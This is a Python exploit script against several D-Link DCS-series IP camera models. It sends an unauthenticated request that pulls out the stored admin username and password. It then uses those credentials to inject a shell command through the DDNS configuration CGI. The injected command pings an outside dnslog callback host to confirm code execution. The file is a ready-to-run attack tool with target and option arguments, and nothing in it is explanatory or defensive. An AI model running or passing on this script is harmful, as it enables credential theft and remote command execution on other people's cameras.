# DCS-2670/DCS-4603/DCS-4701E/DCS-4703E/DCS-4705E/DCS-4802E exp
# coding=UTF-8
import argparse

import requests
from requests.auth import HTTPDigestAuth
import urllib3

urllib3.disable_warnings()
import time


def scan(url):
    try:
        r = requests.get(url + "/config/getuser?index=0", timeout=8, verify=False)
        if "name" in r.text and "pass" in r.text and "priv" in r.text and r.status_code == 200:
            poc = r.text.split('\r\n')
            username = poc[0]
            password = poc[1]
            return username[5:], password[5:]
        return "", ""
    except:
        return "", ""


def exp(url, cmd, username, password):
    try:
        headers = {
            "User - Agent": "Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 90.0.4430.212Safari / 537.36"
        }
        r_e = requests.get(url + cmd, auth=HTTPDigestAuth(username, password), headers=headers, timeout=15,
                           verify=False)
    except:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target Host')
    parser.add_argument('-i', '--id', help='id')
    parser.add_argument('-s', '--server', default='127.0.0.1', help='dlserver')
    args = parser.parse_args()
    exploit = "ping%20-c%205%203d65a4.dnslog.cn"
    payload = "/cgi-bin/ddns_enc.cgi?enable=1&hostname=test&interval=24&servername=www.dlinkddns.com&provider=custom&account=111111" + exploit + "&cert=d59a5d592768cc9bcb7dddf925a9f2205f6f5d59fe68cc35cb7d41f92544f2205f6f5d59fe68cc35cb7d41f92544f2205f6f5d59fe68cc35cb7d41f92544f220"
    payload1 = "/cgi-bin/ddns_enc.cgi?enable=1&hostname=test&interval=24&servername=www.dlinkddns.com&provider=custom&account=111111&cert=d59a5d592768cc9bcb7dddf925a9f2205f6f5d59fe68cc35cb7d41f92544f2205f6f5d59fe68cc35cb7d41f92544f2205f6f5d59fe68cc35cb7d41f92544f220"
    username, password = scan(args.target)
    if username:
        print "get auth success"
        exp(args.target, payload, username, password)
        time.sleep(5)
        exp(args.target, payload1, username, password)
